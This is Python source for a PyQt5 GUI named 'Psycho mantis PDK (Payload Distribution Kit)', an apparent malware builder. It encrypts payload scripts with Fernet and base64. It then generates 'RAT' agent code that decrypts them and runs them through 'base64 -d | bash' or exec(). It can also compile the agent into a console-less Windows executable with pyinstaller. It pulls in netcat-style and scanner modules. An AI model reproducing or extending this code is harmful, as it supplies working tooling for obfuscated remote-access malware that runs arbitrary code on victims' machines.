from PyQt5.QtWidgets import (QApplication, 
                             QWidget, 
                             QLabel, 
                             QLineEdit, 
                             QTextEdit, 
                             QPushButton, 
                             QFormLayout, 
                             QTabWidget,
                             QListWidget,
                             QVBoxLayout,
                             QHBoxLayout, 
                             QRadioButton,
                             QTableWidget,
                             QTableWidgetItem,
                             QDialog,
                             QFileSystemModel,
                             QTreeView)

from PyQt5.QtGui import QPalette, QColor
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QTextCursor
from modules.netcat import ChatServer
from modules.scanner import ScannerWindow
import os
import sys
from cryptography.fernet import Fernet
import base64
import subprocess
import pdb

class PopupDialogGenerateAgent(QDialog):

    def __init__(self, parent=None):
        super().__init__(parent)
        
        self.setWindowTitle('Agent Generation')

        self.setGeometry(0, 0, 600, 400)
        self.form_layout = QFormLayout()
        self.main_window = parent

        self.txt_output = QTextEdit()
        self.txt_output.setStyleSheet("background-color: black; color: white; font-size:10pt;")
        self.form_layout.addRow(self.txt_output)
        
        
        self.generate_button = QPushButton("Generate")
        self.generate_button.clicked.connect(self.submit)
        
        self.form_layout.addRow(self.generate_button)
        
        self.setLayout(self.form_layout)

    def submit(self):
        self.txt_output.setPlainText("Generating...".format(self.main_window.txt_agent_name.text()))
        self.flag_python = QRadioButton("py")
        self.flag_python.setChecked(True)
        self.flag_python.setFixedWidth(60)

        self.flag_binary = QRadioButton("exe")
        self.flag_binary.setFixedWidth(60)

    

        
        agent_name = "agents/"+self.main_window.txt_agent_name.text()+".py"
        with open(agent_name, 'w') as wf:
            wf.write(self.main_window.txt_agent_output.toPlainText())
        self.txt_output.setPlainText("{} generated".format(agent_name))

        if self.main_window.flag_binary.isChecked():
            #--icon=app.ico
            command = ['pyinstaller', '--onefile','--noconsole','--distpath','agents', agent_name]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if len(result.stderr)>0:
                output = result.stderr.decode('utf-8')
            else:
                output = result.stdout.decode('utf-8')
                
            print(output)
            self.txt_output.insertPlainText(output)

        self.txt_output.moveCursor(QTextCursor.End)

class App(QWidget):
    def __init__(self):
        super().__init__()
        
        self.title = 'Psycho mantis PDK (Payload Distribution Kit)'
        self.left = 0
        self.top = 0
        self.width = 800
        self.height = 700
        self.payloads_folder = "payloads"
        self.text_out = None
        self.keycode = None

        self.payloads_list = None
        self.radio_payloadtype = None

        self.bash_radio = None
        self.vbs_radio = None
        self.bat_radio = None
        self.python_radio = None

        self.txt_agent_name = None
        self.txt_agent_output = None

        self.payloads_table = None

        self.initUI()
        
    
    def get_payloads(self, list_widget):
        files = os.listdir(self.payloads_folder)
        
        
        for file in files:
            list_widget.addItems([file])
        
        return list_widget    
            
    
    def on_btn_load(self):
        self.text_out.setText("")

        selected_items = self.payloads_list.selectedItems()
        for item in selected_items:
            with open(self.payloads_folder+"/"+item.text(),'r') as fr:
                self.text_out.setText(self.text_out.toPlainText()+"\n"+fr.read())
        
    def on_btn_encrypt(self):
        key = Fernet.generate_key()
        f = Fernet(key)

        b64encoded = base64.b64encode(self.text_out.toPlainText().encode('utf-8'))
        encrypted_message = f.encrypt(b64encoded)

        encoded = encrypted_message.decode('utf-8')
        self.keycode.setText(key.decode('utf-8'))
        self.text_out.setText(encoded)

    def on_delete_button_clicked(self):
        button = self.sender()
        index = self.payloads_table.indexAt(button.pos())
        row = index.row()
        
        self.payloads_table.removeRow(row)
    def on_btn_add(self):
        
        new_key = QTableWidgetItem(self.keycode.text())
        new_code = QTableWidgetItem(self.text_out.toPlainText())
        
        if self.bash_radio.isChecked():
            new_type = QTableWidgetItem("BASH")
        
        elif self.bat_radio.isChecked():
            new_type = QTableWidgetItem("BAT")
        elif self.vbs_radio.isChecked():
            new_type = QTableWidgetItem("VBS")
        elif self.python_radio.isChecked():
            new_type = QTableWidgetItem("PYTHON")
        

        row = self.payloads_table.rowCount()
        self.payloads_table.insertRow(row)
        self.payloads_table.setItem(row, 0, new_key)
        self.payloads_table.setItem(row, 1, new_code)
        self.payloads_table.setItem(row, 2, new_type)
        
        button = QPushButton("X")
        button.clicked.connect(self.on_delete_button_clicked)
        self.payloads_table.setCellWidget(row, 3, button)

        
    def on_btn_generate_rat(self):
        ratc = """
import subprocess
from cryptography.fernet import Fernet
import base64

        """
        for row_payload in range(0,self.payloads_table.rowCount()):
             
            if self.payloads_table.item(row_payload,2).text()=="BASH":
                ratc=ratc+"""
key = "{}"
code = "{}"
f = Fernet(key)
decrypted_message = f.decrypt(bytes(code.encode('utf-8')))
subprocess.call("echo "+decrypted_message.decode('utf-8')+" | base64 -d | bash", shell=True)
            """.format(self.payloads_table.item(row_payload,0).text(), self.payloads_table.item(row_payload,1).text())
            elif self.payloads_table.item(row_payload,2).text()=="PYTHON":
                
                ratc=ratc+"""
key = "{}"
code = "{}"
f = Fernet(key)
decrypted_message = f.decrypt(bytes(code.encode('utf-8')))
exec(base64.b64decode(decrypted_message))
            """.format(self.payloads_table.item(row_payload,0).text(), self.payloads_table.item(row_payload,1).text())
        self.txt_agent_output.setText(ratc)

    def on_btn_save_rat(self):
        popup_gen = PopupDialogGenerateAgent(self)
        popup_gen.exec_()

    def payload_tab(self):
        crypt_tab = QWidget()
        form_crypt_layout = QFormLayout()
        crypt_tab.setLayout(form_crypt_layout)

        
        #PAYLOAD LISTS
        # self.payloads_list = QListWidget()
        # self.payloads_list = self.get_payloads(self.payloads_list)
        
        self.payload_tree = QFileSystemModel()
        self.payload_tree.setRootPath(os.path.expanduser(self.payloads_folder)) 
        self.payload_f_tree = QTreeView()
        self.payload_f_tree.setModel(self.payload_tree)
        self.payload_f_tree.setRootIndex(self.payload_tree.index(os.path.expanduser(self.payloads_folder)))
        self.payload_f_tree.setHeaderHidden(True)
        self.payload_f_tree.setColumnHidden(1, True)
        self.payload_f_tree.setColumnHidden(2, True)
        self.payload_f_tree.setColumnHidden(3, True)


        form_crypt_layout.addRow(QLabel('Payloads:'), self.payload_f_tree)
        

        #PAYLOAD TYPE
        vbox_radio = QHBoxLayout()
        
        self.bash_radio = QRadioButton("Bash")
        self.vbs_radio = QRadioButton("Vbs")
        self.bat_radio = QRadioButton("Bat")
        self.python_radio = QRadioButton("Python")

        self.bash_radio.setFixedWidth(60)
        self.bash_radio.setChecked(True)

        self.vbs_radio.setFixedWidth(60)
        self.bat_radio.setFixedWidth(60)
        self.python_radio.setFixedWidth(60)

        vbox_radio.addWidget(self.bash_radio)
        vbox_radio.addWidget(self.vbs_radio)
        vbox_radio.addWidget(self.bat_radio)
        vbox_radio.addWidget(self.python_radio)

        form_crypt_layout.addRow(QLabel('Type:'), vbox_radio)

        
        #KEYCODE
        self.keycode = QLineEdit()
        form_crypt_layout.addRow(QLabel('Key:'), self.keycode)
        
        #OUTPUT TEXT
        self.text_out = QTextEdit()
        self.text_out.setStyleSheet("background-color: black; color: white; font-size: 10pt;")

        form_crypt_layout.addRow(self.text_out)

        #PAYLOADS TABLE
        self.payloads_table = QTableWidget()
        self.payloads_table.setColumnCount(4)
        #self.payloads_table.setRowCount(1)
        self.payloads_table.setHorizontalHeaderLabels(["Key", "Payload","Type",""])
        self.payloads_table.setVerticalHeaderLabels(["1"])
        
        form_crypt_layout.addRow(self.payloads_table)


        #BUTTONS
        btnbox = QHBoxLayout()
        btn_load = QPushButton('1 - Load')
        btn_load.clicked.connect(self.on_btn_load)
        
        btn_encrypt = QPushButton('2 - Encrypt')
        btn_encrypt.clicked.connect(self.on_btn_encrypt)

        btn_add = QPushButton('3 - Add')
        btn_add.clicked.connect(self.on_btn_add)


        btnbox.addWidget(btn_load)
        btnbox.addWidget(btn_encrypt)
        btnbox.addWidget(btn_add)

        form_crypt_layout.addRow(btnbox)

        return crypt_tab

    def agent_tab(self):

        agent_tab = QWidget()
        form_agent_layout = QFormLayout()
        agent_tab.setLayout(form_agent_layout)


        #AGENT NAME
        self.txt_agent_name = QLineEdit()
        form_agent_layout.addRow(QLabel("Agent name:"), self.txt_agent_name)

        #FLAGS
        self.flag_python = QRadioButton("py")
        self.flag_python.setChecked(True)
        self.flag_python.setFixedWidth(60)

        self.flag_binary = QRadioButton("exe")
        self.flag_binary.setFixedWidth(60)


        box_options = QHBoxLayout()
        box_options.addWidget(self.flag_python)
        box_options.addWidget(self.flag_binary)


        form_agent_layout.addRow(QLabel("Output"), box_options)

        #AGENT OUTPUT
        self.txt_agent_output = QTextEdit()
        self.txt_agent_output.setStyleSheet("background-color: black; color: white; font-size:10pt;")
        form_agent_layout.addRow(self.txt_agent_output)

        #GENERATE BUTTON
        btn_generate_rat = QPushButton("Generate")
        btn_generate_rat.clicked.connect(self.on_btn_generate_rat)
        
        btn_save_rat = QPushButton("Save")
        btn_save_rat.clicked.connect(self.on_btn_save_rat)
        
        hbox_button = QHBoxLayout()
        hbox_button.addWidget(btn_generate_rat)
        hbox_button.addWidget(btn_save_rat)

        form_agent_layout.addRow(hbox_button)

        return agent_tab

    def initUI(self):
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)

        tabs = QTabWidget()

        
        crypt_tab = self.payload_tab()
        agent_tab = self.agent_tab()
        
        #TABS
        tabs.addTab(crypt_tab, 'Python Agent')
        tabs.addTab(agent_tab, 'Output')
        #modules
        chat_server_tab = ChatServer(self, tabs)
        scannet_tab = ScannerWindow(self,tabs)
        
        vbox = QVBoxLayout()
        vbox.addWidget(tabs)
        self.setLayout(vbox)
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(192, 192, 192))
        palette.setColor(QPalette.WindowText, Qt.black)
        self.setPalette(palette)
        self.show()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyle('Windows')
    ex = App()
    
    sys.exit(app.exec_())

    